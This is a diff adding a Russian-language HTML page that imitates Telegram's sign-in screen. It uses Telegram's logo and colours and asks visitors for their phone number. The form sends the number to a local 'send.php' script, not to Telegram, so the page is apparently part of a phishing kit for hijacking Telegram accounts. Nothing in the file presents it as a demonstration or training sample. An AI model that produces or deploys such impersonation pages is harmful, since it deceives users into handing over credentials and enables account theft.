@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram</title>
+<style>
+body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.box { width: 360px; text-align: center; }
+.logo { width: 160px; margin-bottom: 30px; }
+h2 { font-weight: 400; color: #222; }
+input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+button { width: 100%; padding: 12px; background: #2AABEE; color: #fff; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+button:hover { background: #229ED9; }
+</style>
+</head>
+<body>
+<div class="box">
+  <img class="logo" src="https://telegram.org/img/t_logo.png" alt="Telegram">
+  <h2>Sign in to Telegram</h2>
+  <p style="color:#888;font-size:14px;">Please confirm your country code and enter your phone number.</p>
+  <form action="send.php" method="POST">
+    <input type="tel" name="phone" placeholder="Phone number" required>
+    <button type="submit">Next</button>
+  </form>
+</div>
+</body>
+</html>
